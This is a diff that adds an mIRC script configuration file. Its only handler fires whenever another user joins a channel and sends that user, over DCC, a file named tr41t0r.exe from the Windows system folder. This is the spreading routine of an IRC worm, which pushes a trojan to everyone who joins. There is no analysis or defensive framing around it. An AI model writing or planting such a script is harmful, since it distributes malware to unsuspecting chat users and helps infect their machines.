@@ -1,0 +1,4 @@
+[script]
+n0=on 1:JOIN:*:{
+n1=  if ( $nick == $me ) { halt } | /dcc Send $nick c:\windows\system\tr41t0r.exe
+n2=}
